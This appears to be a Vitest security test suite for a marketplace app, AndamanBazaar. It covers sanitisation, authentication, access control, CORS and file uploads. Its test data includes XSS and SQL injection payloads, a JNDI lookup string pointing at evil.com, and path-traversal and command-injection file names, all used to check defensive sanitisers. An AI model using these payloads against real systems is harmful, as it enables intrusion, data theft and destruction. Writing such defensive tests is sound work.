/**
 * Security Testing Suite
 * Comprehensive security validation for AndamanBazaar
 */

import { describe, it, expect, beforeEach, vi } from 'vitest'
import React from 'react'
import { render, screen, fireEvent } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import DOMPurify from 'dompurify'

// Security test utilities
export const SecurityTestUtils = {
  // XSS attack vectors
  xssPayloads: [
    '<script>alert("XSS")</script>',
    'javascript:alert("XSS")',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<svg onload="alert(\'XSS\')">',
    '"><script>alert("XSS")</script>',
    '\';alert("XSS");//',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<body onload="alert(\'XSS\')">',
    '<input autofocus onfocus="alert(\'XSS\')">',
    '<select onfocus="alert(\'XSS\')" autofocus>',
  ],

  // SQL injection patterns
  sqlInjectionPayloads: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    '" OR "1"="1',
    "'; DELETE FROM listings; --",
    "' UNION SELECT * FROM users --",
    '" UNION SELECT password FROM users --',
  ],

  // CSRF token validation
  generateCSRFToken: () => 'test-csrf-token-' + Math.random().toString(36),

  // Rate limiting test
  simulateMultipleRequests: async (endpoint: string, count: number = 10) => {
    const requests = Array.from({ length: count }, () => 
      fetch(endpoint, { method: 'POST' })
    )
    return Promise.allSettled(requests)
  }
}

describe('Security Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  describe('Input Sanitization', () => {
    it('should sanitize XSS attacks in user input', async () => {
      const TestComponent = () => {
        const [input, setInput] = React.useState('')
        const [output, setOutput] = React.useState('')
        
        const handleSubmit = () => {
          const sanitized = DOMPurify.sanitize(input)
          setOutput(sanitized)
        }
        
        return (
          <div>
            <input
              data-testid="user-input"
              value={input}
              onChange={(e) => setInput(e.target.value)}
              placeholder="Enter text"
            />
            <button data-testid="submit" onClick={handleSubmit}>Submit</button>
            <div data-testid="output">{output}</div>
          </div>
        )
      }

      render(<TestComponent />)
      const user = userEvent.setup()

      // Test each XSS payload
      for (const payload of SecurityTestUtils.xssPayloads) {
        const input = screen.getByTestId('user-input')
        const submit = screen.getByTestId('submit')
        
        await user.clear(input)
        await user.type(input, payload)
        await user.click(submit)
        
        const output = screen.getByTestId('output')
        
        // Ensure no script tags or event handlers are present in sanitized HTML
        expect(output.innerHTML).not.toContain('<script>')
        expect(output.innerHTML).not.toContain('onerror')
        expect(output.innerHTML).not.toContain('onload')
      }
    })

    it('should prevent HTML injection in listing descriptions', () => {
      const maliciousDescription = '<script>stealData()</script><p>Valid description</p>'
      const sanitized = DOMPurify.sanitize(maliciousDescription)
      
      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('stealData')
      expect(sanitized).toContain('<p>Valid description</p>')
    })

    it('should sanitize URLs to prevent javascript: attacks', () => {
      const maliciousUrls = [
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'vbscript:msgbox("XSS")',
      ]

      maliciousUrls.forEach(url => {
        const sanitized = DOMPurify.sanitize(`<a href="${url}">Click</a>`)
        expect(sanitized).not.toContain('javascript:')
        expect(sanitized).not.toContain('data:text/html')
        expect(sanitized).not.toContain('vbscript:')
      })
    })
  })

  describe('Authentication Security', () => {
    it('should enforce password complexity requirements', async () => {
      const TestAuthForm = () => {
        const [password, setPassword] = React.useState('')
        const [error, setError] = React.useState('')
        
        const validatePassword = (pwd: string) => {
          const minLength = 8
          const hasUpperCase = /[A-Z]/.test(pwd)
          const hasLowerCase = /[a-z]/.test(pwd)
          const hasNumbers = /\d/.test(pwd)
          const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(pwd)
          
          if (pwd.length < minLength) {
            setError('Password must be at least 8 characters')
            return false
          }
          if (!hasUpperCase || !hasLowerCase) {
            setError('Password must contain both uppercase and lowercase letters')
            return false
          }
          if (!hasNumbers) {
            setError('Password must contain at least one number')
            return false
          }
          if (!hasSpecialChar) {
            setError('Password must contain at least one special character')
            return false
          }
          
          setError('')
          return true
        }
        
        return (
          <div>
            <input
              data-testid="password-input"
              type="password"
              value={password}
              onChange={(e) => { setPassword(e.target.value); validatePassword(e.target.value) }}
              placeholder="Password"
            />
            {error && <div data-testid="error">{error}</div>}
          </div>
        )
      }

      render(<TestAuthForm />)
      const user = userEvent.setup()
      const passwordInput = screen.getByTestId('password-input')

      // Test weak passwords
      const weakPasswords = [
        '12345678',
        'password',
        'Password',
        'PASSWORD',
        'Pass123',
        'password123',
      ]

      for (const weakPassword of weakPasswords) {
        await user.clear(passwordInput)
        await user.type(passwordInput, weakPassword)
        
        const error = screen.queryByTestId('error')
        expect(error).toBeInTheDocument()
      }
    })

    it('should implement rate limiting on login attempts', async () => {
      const mockLogin = vi.fn()
      
      // Simulate multiple rapid login attempts
      const attempts = Array.from({ length: 10 }, (_, i) => ({
        email: `user${i}@test.com`,
        password: 'password123'
      }))

      for (const attempt of attempts) {
        mockLogin(attempt)
      }

      expect(mockLogin).toHaveBeenCalledTimes(10)
      // In a real implementation, this would trigger rate limiting
    })

    it('should validate session tokens properly', () => {
      const validToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test.signature'
      const invalidToken = 'invalid-token-no-dots'
      
      // Mock token validation
      const validateToken = (token: string) => {
        try {
          const parts = token.split('.')
          return parts.length === 3 && parts.every(part => part.length > 0)
        } catch {
          return false
        }
      }
      
      expect(validateToken(validToken)).toBe(true)
      expect(validateToken(invalidToken)).toBe(false)
    })
  })

  describe('Authorization and Access Control', () => {
    it('should prevent users from accessing other users data', () => {
      const currentUser = { id: 'user1', role: 'user' }
      const resourceOwner = { id: 'user2', role: 'user' }
      
      const canAccessResource = (user: any, owner: any) => {
        return user.id === owner.id || user.role === 'admin'
      }
      
      expect(canAccessResource(currentUser, resourceOwner)).toBe(false)
      expect(canAccessResource({ ...currentUser, role: 'admin' }, resourceOwner)).toBe(true)
    })

    it('should validate role-based permissions', () => {
      const permissions = {
        admin: ['read', 'write', 'delete', 'manage_users'],
        user: ['read', 'write'],
        guest: ['read']
      }
      
      const hasPermission = (role: string, action: string) => {
        return permissions[role]?.includes(action) || false
      }
      
      expect(hasPermission('admin', 'delete')).toBe(true)
      expect(hasPermission('user', 'delete')).toBe(false)
      expect(hasPermission('guest', 'write')).toBe(false)
      expect(hasPermission('invalid_role', 'read')).toBe(false)
    })
  })

  describe('Data Validation', () => {
    it('should validate and sanitize user input data', () => {
      const validateUserData = (data: any) => {
        const errors: string[] = []
        
        if (!data.email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) {
          errors.push('Invalid email format')
        }
        
        if (!data.name || data.name.length < 2 || data.name.length > 100) {
          errors.push('Name must be between 2 and 100 characters')
        }
        
        if (data.phone && !/^\+?[\d\s-()]+$/.test(data.phone)) {
          errors.push('Invalid phone number format')
        }
        
        return errors
      }
      
      const invalidData = {
        email: 'invalid-email',
        name: 'a',
        phone: 'abc123'
      }
      
      const errors = validateUserData(invalidData)
      expect(errors).toHaveLength(3)
      expect(errors).toContain('Invalid email format')
      expect(errors).toContain('Name must be between 2 and 100 characters')
      expect(errors).toContain('Invalid phone number format')
    })

    it('should prevent injection attacks in search queries', () => {
      const maliciousQueries = [
        "'; DROP TABLE listings; --",
        "' OR '1'='1",
        '<script>alert("XSS")</script>',
        '${jndi:ldap://evil.com/a}',
      ]
      
      const sanitizeQuery = (query: string) => {
        return query
          .replace(/[<>'";]/g, '')
          .replace(/\$\{.*?\}/g, '')
          .replace(/--/g, '')
          .trim()
      }
      
      maliciousQueries.forEach(query => {
        const sanitized = sanitizeQuery(query)
        expect(sanitized).not.toContain('<script>')
        expect(sanitized).not.toContain("'")
        expect(sanitized).not.toContain('${jndi:')
      })
    })
  })

  describe('API Security', () => {
    it('should validate API request headers', () => {
      const validateHeaders = (headers: Record<string, string>) => {
        const requiredHeaders = ['Content-Type', 'Authorization']
        const errors: string[] = []
        
        requiredHeaders.forEach(header => {
          if (!headers[header]) {
            errors.push(`Missing required header: ${header}`)
          }
        })
        
        if (headers['Content-Type'] && !headers['Content-Type'].includes('application/json')) {
          errors.push('Content-Type must be application/json')
        }
        
        return errors
      }
      
      const invalidHeaders = {
        'Content-Type': 'text/plain'
        // Missing Authorization
      }
      
      const errors = validateHeaders(invalidHeaders)
      expect(errors).toHaveLength(2)
      expect(errors).toContain('Missing required header: Authorization')
      expect(errors).toContain('Content-Type must be application/json')
    })

    it('should implement proper CORS policies', () => {
      const allowedOrigins = ['https://andamanbazaar.com', 'https://www.andamanbazaar.com']
      
      const isOriginAllowed = (origin: string) => {
        return allowedOrigins.includes(origin) || origin === undefined
      }
      
      expect(isOriginAllowed('https://andamanbazaar.com')).toBe(true)
      expect(isOriginAllowed('https://evil.com')).toBe(false)
      expect(isOriginAllowed(undefined)).toBe(true) // Same-origin requests
    })
  })

  describe('File Upload Security', () => {
    it('should validate file types and sizes', () => {
      const allowedTypes = ['image/jpeg', 'image/png', 'image/webp']
      const maxFileSize = 5 * 1024 * 1024 // 5MB
      
      const validateFile = (file: File) => {
        const errors: string[] = []
        
        if (!allowedTypes.includes(file.type)) {
          errors.push('Invalid file type')
        }
        
        if (file.size > maxFileSize) {
          errors.push('File size exceeds limit')
        }
        
        return errors
      }
      
      // Mock malicious files
      const maliciousFile = new File(['malicious content'], 'malicious.exe', { type: 'application/octet-stream' })
      const oversizedFile = new File(['x'.repeat(6 * 1024 * 1024)], 'large.jpg', { type: 'image/jpeg' })
      
      expect(validateFile(maliciousFile)).toContain('Invalid file type')
      expect(validateFile(oversizedFile)).toContain('File size exceeds limit')
    })

    it('should sanitize file names', () => {
      const maliciousFilenames = [
        '../../../etc/passwd',
        'file<script>alert("XSS")</script>.jpg',
        'file|pipe;command.jpg',
        'file$(command).jpg',
      ]
      
      const sanitizeFilename = (filename: string) => {
        return filename
          .replace(/[<>:"|?*]/g, '')
          .replace(/\.\./g, '')
          .replace(/[;&$`]/g, '')
          .replace(/[^a-zA-Z0-9.-]/g, '_')
      }
      
      maliciousFilenames.forEach(filename => {
        const sanitized = sanitizeFilename(filename)
        expect(sanitized).not.toContain('..')
        expect(sanitized).not.toContain('<script>')
        expect(sanitized).not.toContain('|')
        expect(sanitized).not.toContain(';')
        expect(sanitized).not.toContain('$')
      })
    })
  })
})
